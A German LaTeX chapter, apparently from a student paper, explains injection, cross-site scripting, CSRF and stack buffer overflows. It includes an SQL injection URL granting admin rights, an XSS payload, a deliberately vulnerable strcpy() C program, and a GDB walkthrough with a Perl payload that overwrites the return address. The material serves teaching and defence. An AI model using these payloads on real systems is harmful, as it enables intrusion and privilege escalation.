\section{Schwachstellen}\label{schwachstellen}

In den folgenden Kapiteln werden die Top 3 der am häufigsten\footnote{http://cwe.mitre.org/top25/} anzutreffenden Schwachstellen aus Sicht des Common Weakness Enumeration (CWE) Projekts\footnote{http://cwe.mitre.org/} vorgestellt. Dabei handelt es sich gemäß der Statistik des CWE um folgende Schwachstellenkategorien:

\begin{itemize}
      \item SQL-Injection
      \item OS-Command-Injection
      \item Buffer-Overflows
      \item Cross-Site-Scripting
\end{itemize}

Im Rahmen dieser Ausarbeitung werden die Kategorien SQL-Injection und OS-Command-Injection aufgrund ihrer sehr ähnlichen Funktionsweise unter Injection-Schwachstellen zusammengefasst.

Dabei kommen typische Injection- und Cross-Site-Scripting-Schwachstellen vermehrt bei webbasierten Anwendungen vor, während Buffer-Overflow-Schwachstellen typischerweise in Binäranwendungen oder Runtime-basierenden Anwendungen zu finden sind.
Alle drei Schwachstellenkategorien verfügen über eine Gemeinsamkeit: Die Schwachstellen basieren immer auf einer unzureichenden Validierung von  Ein- oder Ausgabewerten. 

Bei Buffer-Overflow Schwachstellen kann es sich im beispielsweise um vom Anwendungsnutzer überlange eingegebene Zeichenketten handeln, die dazu führen, einen reservierten Bereich im Speicher zu überschreiben. Bei Injection-Schwachstellen handelt es sich meist um Datenbank- oder Betriebssystembefehle, die über einen unzureichend validierten Eingabeparameter einer Webanwendung an das Datenbank- oder Betriebssystem durchgereicht werden.
 
Bei Cross-Site-Scripting wird ebenfalls wie bei Injection-Schwachstellen über einen unzureichend validierten Eingabeparameter JavaScript-Code in eine webbasierte Anwendung eingeschleust, der im Browser eines Anwendungsnutzer zur Ausführung kommt.

Die folgenden Abschnitte erläutern die einzelnen Schwachstellenkategorien und zeigen gängige Maßnahmen zur Erkennung und Behebung der Schwachstellen auf.

\subsection{Webbasierte Schwachstellen}

In den folgenden Kapiteln werden typische webbasierte Schwachstellen und mögliche Maßnahmen zu deren Behebung beschrieben.
Im aktuellsten Report (Draft 2013) des Open Web Application Security Project (OWASP), einer Non-Profit Organisation die sich zum Ziel gesetzt hat die Sicherheit von Webanwendungen zu verbessern, werden die folgenden TOP 10 Bedrohungen bei der Entwicklung von Webanwendungen aufgeführt:


\subsubsection{Injection-Schwachstellen}

Zur dieser Schachstellenkategorie zählen typischerweise SQL-, LDAP- oder XPath-Injections. Diese Schwachstellen treten bei Anwendungen auf, die nicht vertrauenswürdige Eingaben (z.B. durch einen Anwender) nicht ausreichend prüfen.
\\
\textbf{Beispiel:}
\\
Eine Applikation verfügt über eine Suchfunktion, die es einen Anwender ermöglicht, über ein Suchformaluar nach Benutzer-IDs
zu suchen. Die Suche ist über das Suchformular "suche.php" realisiert
\\
\textbf{URL:} http://www.beliebigedomain.de/suche.php?id=4711
\\
\textbf{Erzeugtes SQL-Statement:}
\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
SELECT benutzer, email FROM users WHERE id=4711;
\end{lstlisting}
Da die Anwendung den Wert des Übergabeparameters "id" nicht ausreichend validiert, kann ein Angreifer das SQL-Statement beliebig erweitern:
\\
\textbf{URL:} http://www.beliebigedomain.de/suche.php?id=4711; UPDATE users SET\\isAdmin=1 WHERE id=235;
\\
\textbf{Erzeugtes SQL-Statement:}
\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
SELECT benutzer, email FROM users WHERE id=4711; 
UPDATE users SET isAdmin=1 WHERE id=235;
\end{lstlisting}

\textbf{Maßnahmen}
\\
Um Anwendungen vor Injection-Schwachstellen zu schützen, empfiehlt es sich neben einer serverseitigen Validierung aller Eingabeparameter und deren Prüfung auf kritische Zeichenketten wie beispielsweise Anführungszeichen oder Semikolon, bereits im Entwicklungsprozess regelmäßig statische Quellcode-Analyse durchzuführen.

\subsubsection{Cross Site Scripting-Schwachstellen}

Cross-Site-Scripting-Schwachstellen ähneln stark Injection-Schwachstellen. Die Schwachstellen basieren, ähnlich klassischer Injection-Schwachstellen auf einer unzureichenden Eingabevalidierung. Bei dieser Schwachstellenkategorie wird HTML– oder JavaScript-Code in den Browser des Anwendungsnutzers "injecteted". 

Die eigentliche Anwendung ist nur indirekt von dieser Schwachstelle betroffen, das eigentliche Ziel ist ein Anwender der betroffenen Applikation. Cross-Site-Scripting-Schwachstellen lassen sich generell in zwei beiden Arten unterscheiden:

\minisec{Persistentes Cross-Site-Scripting}

Bei persistentem Cross-Site Scripting wird der applikationsfremde JavaScript-Code dauerhaft in der verwundbaren Anwendung platziert. Besucht ein Nutzer eine Seite, in der dieser Code eingebettet ist, wird er ohne weitere Interaktion des Benutzers übertragen und in dessen Browser interpretiert bzw. ausgeführt.

\minisec{Nicht-persistentes Cross-Site-Scripting }

Bei nicht-persistentem Cross-Site Scripting (auch reflexives Cross-Site-Scripting genannt) muss der JavaScript-Code dagegen mit jeder Anfrage an die Anwendung übertragen werden. Dies kann ein Angreifer beispielsweise dadurch erreichen, indem er dem Opfer eine E-Mail zustellt, die einen Link mit entsprechend präparierten Parameterwerten enthält.

\textbf{Beispiel: Reflektives Cross-Site-Scripting}

Der folgende Beispielscode gibt den Wert des Parameters \texttt{msg} auf au einer Webseite aus:

\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
<html>
<body>
<h1>Beispiel: Ausgabe des GET-Parameters "msg"</h1>
<br>
<?
echo 'String: '. $_GET["msg"];
?>
</body>
</html>
\end{lstlisting}

\textbf{URL:} http://domain.de/FUH/msg.php?msg=das+ist+ein+beispiel

\begin{figure}[htbp]
 \centering
 \includegraphics[scale=.75]{abbildungen/xss_1}
 \caption{Ausgabe des eines Beispiel-Strings}
 \label{fig:xss_1} 
\end{figure}

Da im Beispiel keine serverseitige Validierung des Parameters „msg“ vorgenommen wird, ist der Parameter anfällig für Corss-Site-Scripting.
Wird an die URL aus dem vorhergehenden Beispiel JavaScript Code angehängt, wird der Code vom Browser des Anwenders interpretiert und ausgeführt.
\\
\textbf{URL:} http://domain.de/FUH/msg.php?msg=das+ist+ein+beispiel\\<script>alert('XSS')</script>

\begin{figure}[htbp]
 \centering
 \includegraphics[scale=.75]{abbildungen/xss_2}
 \caption{Der JavaScript-Code kommt im Browser zu Ausführung}
 \label{fig:xss_1} 
\end{figure}

Betrachtet man den Quellcode der Webseite, erkennt man den eingebetteten JavaScript-Code:

\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
<html>
<body>
<h1>Beispiel: Ausgabe des GET-Parameters "msg"</h1>
<br>
String: das ist ein beispiel<script>alert('XSS')</script></body>
</html>
\end{lstlisting}

\subsubsection{Cross Site Request Forgery}
Bei Cross-Site Request Forgery handelt es sich um eine Angriffstechnik, mit der Daten in der Anwendung unberechtigt verändert werden können. Dabei bringt ein Angreifer den Webbrowser eines bereits authentisierten Benutzers dazu, eine HTTP-Anfrage an die Webanwendung zu stellen. Der Angreifer wählt diese Anfrage so, dass die Webanwendung die ihm gewünschte Funktion (z.B. eine Passwortänderung) ausführt. Sofern das Opfer angemeldet ist und somit bereits über eine gültige Session verfügt, während die HTTP-Anfrage ausgeführt wird, nimmt die Webanwendung die Anfrage entgegen und führt sie mit den Rechten des Opfers aus.

Die Webanwendung kann dabei nicht zwischen HTTP-Anfragen unterscheiden, die korrekt durch den Benutzer initiiert wurde und solchen, die durch CSRF in den Browser des Opfers eingeschleust wurden. Da der Angriff ausschließlich im Webbrowser des Opfers stattfindet und der Angreifer selbst weder aktiv noch passiv mit der Webanwendung interagiert, ist dieser Angriff unmittelbar nur zum Manipulieren von Daten geeignet. Daten direkt auszulesen bzw. mitzulesen ist nicht möglich. Um eine CSRF-Schwachstelle ausnutzen zu können, müssen einige Vorbedingungen erfüllt sein:


\begin{itemize}
      \item Die Webanwendung muss anfällig für CSRF sein
	  \item Das Opfer muss an der Applikation angemeldet sein
	  \item Das Opfer muss dazu gebracht werden, eine HTTP-Anfrage abzusetzen (beispielsweise durch Anklicken eines manipulierten Links
\end{itemize}

Eine Webanwendung ist  anfällig für CSRF, wenn Anfragen an den Webserver statisch sind und keine zufällige Komponente (Token) beinhalten. In diesem Fall können die Anfragen vorab konstruiert und direkt an den Webserver geschickt werden, ohne dass man zuvor die eigentlichen Formulare der Applikation ausgefüllt haben muss.
Im Folgenden ist exemplarisch eine CSRF-Schwachstelle innerhalb der Applikation beschrieben.


\subsection{Binäre Anwendungen}	

\subsubsection{Buffer-Overflow Schwachstellen}	

Buffer-Overflows Schwachstellen entstehen im Regelfall durch die Verwendung von Programmiersprachen, die es einem Entwickler ermöglichen, allozierte Speicherbereiche unkontrolliert zu überschreiben.
\par\medskip 
Als ein typischer Vertreter für eine Programmiersprache die potentiell für Buffer-Schwachstellen anfällig ist, gilt die Programmiersprache C. Die Programmiersprache ermöglicht es einem Entwickler, nahezu beliebige Speicheradressen zu überschreiben und bietet darüber hinaus noch zahlreiche eigene, native C-Funktionen (z.B. \texttt{strcpy()}), die unabhängig vom Entwickler keinerlei Prüfungen in Hinsicht auf den benötigten Speicherplatz implementiert haben.
\\\\
\textbf{Beispiel: Stack-Overflow (Setup: x64-System, Linux, gcc-4.8.1)}
\\
Der C-Code im folgenden Beispiel erwartet die Eingabe einer beliebigen Zeichenkette mit einer maximalen Länge von 64 Zeichen als Kommandozeilenparameter. Die im Code verwendete C-Funktion \texttt{strcpy()} gilt als unsicher, da keine Längenprüfung des zu kopierenden Strings vorgenommen wird. Mithilfe der \texttt{strcpy()}-Funktion ist es später möglich, die Rücksprungadresse der \texttt{go()}-Funktion so zu modifizieren, dass die im Code nicht aufgerufene Funktion \texttt{pwnd()} ausgeführt wird.

\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

int go(char *input) {
        char data[64];
        strcpy(data,input);
        printf ("String: %s\n", data);
        return 1;
}

void pwnd(void) {
        printf("\nPWND!\n");
        exit(0);
}

int main(int argc, char *argv[]) {
        if (argc > 1)
        go(argv[1]);
}
\end{lstlisting}

\begin{figure}[htbp]
 \centering
 \includegraphics[scale=.5]{abbildungen/poc_1}
 \caption{Reguläre Funktionsweise des Programms}
 \label{fig:poc_1} 
\end{figure}

Im Folgenden wird das Programm analysiert und versucht, durch eine erfolgreiche Modifikation der Speicheradressen die Funktion \texttt{pwnd()} aufzurufen.
Um das Programm zu analysieren wird der GNU Debugger\footnote{http://www.gnu.org/software/gdb} (GDB-Kurzreferenz\footnote{http://beej.us/guide/bggdb}) verwendet. Für einen ersten Überblick werden die drei Funktionen disassembliert.
\\
\\
\texttt{main()}-Funktion
\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
[florian@audit exploit]$ gdb -q poc
Reading symbols from /home/florian/exploit/poc...done.
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000400624 <+0>:     push   %rbp
   [...]
   0x000000000040063d <+25>:    add    $0x8,%rax
   0x0000000000400641 <+29>:    mov    (%rax),%rax
   0x0000000000400644 <+32>:    mov    %rax,%rdi
   0x0000000000400647 <+35>:    callq  0x4005d0 <go>
   0x000000000040064c <+40>:    leaveq
   0x000000000040064d <+41>:    retq
End of assembler dump.
\end{lstlisting}
\texttt{go()}-Funktion
\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
(gdb) disas go
Dump of assembler code for function go:
   [...]
   0x00000000004005e0 <+16>:    lea    -0x40(%rbp),%rax
   0x00000000004005e4 <+20>:    mov    %rdx,%rsi
   0x00000000004005e7 <+23>:    mov    %rax,%rdi
   0x00000000004005ea <+26>:    callq  0x400480 <strcpy@plt>
   0x00000000004005ef <+31>:    lea    -0x40(%rbp),%rax
   0x00000000004005f3 <+35>:    mov    %rax,%rsi
   0x00000000004005f6 <+38>:    mov    $0x4006d4,%edi
   0x00000000004005fb <+43>:    mov    $0x0,%eax
   0x0000000000400600 <+48>:    callq  0x4004a0 <printf@plt>
   0x0000000000400605 <+53>:    mov    $0x1,%eax
   0x000000000040060a <+58>:    leaveq
   0x000000000040060b <+59>:    retq
End of assembler dump.
\end{lstlisting}
\texttt{pwnd()}-Funktion
\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
(gdb) disas pwnd
Dump of assembler code for function pwnd:
   0x000000000040060c <+0>:     push   %rbp
   [...]
\end{lstlisting}
\par\medskip 
Aus den disassemblierten Funktionen können folgende Informationen entnommen werden:
\\
\textbf{\texttt{main()}-Funktion}

\begin{itemize}
      \item \texttt{0x0000000000400647 <+35>:    callq  0x4005d0 <go>}\\
        An dieser Stelle wird durch einen \texttt{call} die Funktion \texttt{go()} aufgerufen.
      \item \texttt{0x000000000040064c <+40>:    leaveq}\\
        Wurde die \texttt{go()}-Funktion erfolgreich durchlaufen, wird aus der \texttt{go()}-Funktion an diese Speicheradresse in die \texttt{main()}-Funktion zurückgesprungen.       
\end{itemize}
\textbf{\texttt{go()}-Funktion}

\begin{itemize}
      \item \texttt{x00000000004005ef <+31>:    lea    -0x40	(\%rbp), \%rax}\\
        Aufgrund des vorhandenen C-Code ist bereits bekannt, dass für die \texttt{strcpy()}-Funktion ein \SI{64}{Byte} großes Charakter-Array (\texttt{char data[64]}) als Ziel des Kopiervorgangs reserviert wurde. Läge der C-Code nicht vor, könnte man durch den hexadezimalen Wert \texttt{0x40} die maximale Speichergröße von \SI{64}{Byte} feststellen.        
      \item \texttt{0x000000000040060b <+59>:    retq}\\
        Nach der Ausführung dieser Instruktion muss der Befehlszeiger (IP, bei x64 RIP abgekürzt) auf die Speicheradresse \texttt{0x40064c} innerhalb der \texttt{main()}-Funktion zeigen.
\end{itemize}



\textbf{\texttt{pwnd()}-Funktion}

\begin{itemize}
      \item \texttt{0x000000000040060c <+0>:     push   \%rbp}\\
        Um die \texttt{pwnd()}-Funktion aus der \texttt{pwnd()}-Funktion heraus aufrufen zu können, muss der Befehlszeiger (RIP) innerhalb der \texttt{go()}-Funktion auf die Speicheradresse \texttt{0x40060c} geändert werden. 
\end{itemize}

Im Folgenden wird das Programm mit dem GDB gestartet, davor wird noch ein Haltepunkte an der Speicheradresse \texttt{0x40060b} gesetzt (siehe letzte Zeile der disassemblierten \texttt{go()} -Funktion) um die Überlegungen verifizieren zu können.
        
\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
gdb) break *0x40060b
Breakpoint 6 at 0x40060b: file poc.c, line 13.
(gdb) run AAAAAAAA

String: AAAAAAAA

Breakpoint 6, 0x000000000040060b in go (input=0x7fffffffecdb "AAAAAAAA") at poc.c:13
13      }
(gdb) p &data
$20 = (char (*)[64]) 0x7fffffffe950
(gdb) x/12xg 0x7fffffffe950
0x7fffffffe950: 0x4141414141414141      0x00007ffff7ff9100
0x7fffffffe960: 0x00007ffff7ffe190      0x0000000000f0b2ff
0x7fffffffe970: 0x0000000000000001      0x000000000040069d
0x7fffffffe980: 0x00007fffffffe9be      0x0000000000000000
0x7fffffffe990: 0x00007fffffffe9b0      0x000000000040064c
0x7fffffffe9a0: 0x00007fffffffea98      0x0000000200000000
(gdb)
\end{lstlisting}

Das Programm wird mit 8-mal "A" als Konsolenparameter gestartet. Ist der Haltepunkte erreicht, wird der \SI{64}{Byte} große Speicherbereich der Variablen \texttt{data} gesucht. Im Anschluss werden vom Beginn des Speicherbereichs der Variablen \texttt{data} 12-mal \SI{8}{Byte} große Speicherbereiche dargestellt. 

Die ersten \SI{8}{Byte} entsprechen der hexadezimalen Darstellung der Zeichenfolge \texttt{AAAAAAAA}, die als Übergabeparameter verwendet wurde. Die folgenden 7-mal \SI{8}{Byte} großen Speicherblöcke werden nicht verwendet und beinhalten ausschließlich zufällige Werte. Um die Rücksprungadresse erfolgreich zu modifizieren, sind die folgenden \SI{8}{Byte} bzw. \SI{16}{Byte} relevant:

\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
0x7fffffffe990: 0x00007fffffffe9b0      0x000000000040064c
\end{lstlisting}

Der linke Teil entspricht dem Basepointer (RBP), der rechte Teil entspricht der Rücksprungadresse in die \texttt{main()}-Funktion. Wird diese Adresse mit der Speicheradresse der \texttt{pwnd()}-Funktion überschrieben, so springt das Programm zur Laufzeit in die \texttt{pwnd()}-Funktion und führt diese aus.
 
Mit den folgenden Befehlen wird die \texttt{go()}-Funktion disassembliert, um die Startwert der \texttt{go()}-Funktion festzustellen. Im Anschluss werden die 12-mal \SI{8}{Byte} großen Speicheradressen ausgegeben und zwei Byte der Rücksprungadresse \texttt{0x40064c} modifiziert. Danach wird das Programm weiter ausgeführt und wie springt in die \texttt{pwnd()}-Funktion.

\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
(gdb) disas pwnd
Dump of assembler code for function pwnd:
   0x000000000040060c <+0>:     push   %rbp
   [...]	

End of assembler dump.
(gdb) x/12xg 0x7fffffffe950
0x7fffffffe950: 0x4141414141414141      0x00007ffff7ff9100
0x7fffffffe960: 0x00007ffff7ffe190      0x0000000000f0b2ff
0x7fffffffe970: 0x0000000000000001      0x000000000040069d
0x7fffffffe980: 0x00007fffffffe9be      0x0000000000000000
0x7fffffffe990: 0x00007fffffffe9b0      0x000000000040064c
0x7fffffffe9a0: 0x00007fffffffea98      0x0000000200000000
(gdb) set {char}0x7fffffffe998 = 0x0c
(gdb) set {char}0x7fffffffe999 = 0x06
(gdb) x/12xg 0x7fffffffe950
0x7fffffffe950: 0x4141414141414141      0x00007ffff7ff9100
0x7fffffffe960: 0x00007ffff7ffe190      0x0000000000f0b2ff
0x7fffffffe970: 0x0000000000000001      0x000000000040069d
0x7fffffffe980: 0x00007fffffffe9be      0x0000000000000000
0x7fffffffe990: 0x00007fffffffe9b0      0x000000000040060c
0x7fffffffe9a0: 0x00007fffffffea98      0x0000000200000000
(gdb) c
Continuing.
PWND!
[Inferior 1 (process 1190) exited normally]
(gdb)
\end{lstlisting}

Um den Aufwand einer manuellen Modifikation der Speicheradresse möglichst gering zu halten, kann man den Vorgang mit der \texttt{Perl} automatisieren:

\begin{lstlisting}[basicstyle=\ttfamily\footnotesize]
(gdb) run `perl -e 'print "A"x72 . "\x0c\x06\x40"'`
String: AAAAAAAAAAAAAAAAAAAAAAAAA ... AAAAAA@
PWND!
[Inferior 1 (process 1624) exited normally]
(gdb)
\end{lstlisting}

Dabei werden insgesamt \SI{72}{Byte} mit dem Zeichen \texttt{A} überschrieben und \SI{3}{Byte} mit hexadezimalen Werten:

\begin{itemize}
      \item \SI{64}{Byte} Speicherplatz der \texttt{data}-Variablen    
      \item \SI{8}{Byte} Basepointer
      \item \SI{3}{Byte} Rücksprungadresse unter Berücksichtigung der Byteorder (Little-Endian)
\end{itemize}

\textbf{Hinweis:}

Wird zur Nachstellung des Beispiels ein veralteter \texttt{gcc}-Compiler in der Version 3.x\footnote{http://www.trapkit.de/papers/gcc\_stack\_layout\_v1\_20030830.pdf} verwendet, ist es möglich, dass dieses Beispiel nicht funktioniert!